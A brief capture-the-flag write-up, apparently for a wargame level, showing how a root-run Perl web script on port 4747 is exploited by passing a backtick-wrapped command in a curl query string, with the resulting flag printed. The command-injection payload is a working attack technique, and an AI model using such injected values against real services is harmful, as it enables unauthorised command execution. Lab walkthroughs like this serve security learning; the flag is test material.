# you can find a level04.pl file, which is a perl script
# it appears to receive an http request on port 4747, and display its content by running echo
# by running ps, we can see that it is running in root
ps -eaf  | grep level04 #> root      1853  1814  0 04:44 ?        00:00:00 sshd: level04 [priv]
# we can therefore send a request to it, usin whatever argument we want
# we use an argument that will expend to the result of getflag
curl -X GET localhost:4747/?x=\`getflag\` # > ne2searoevaevoem4ov4ar8ap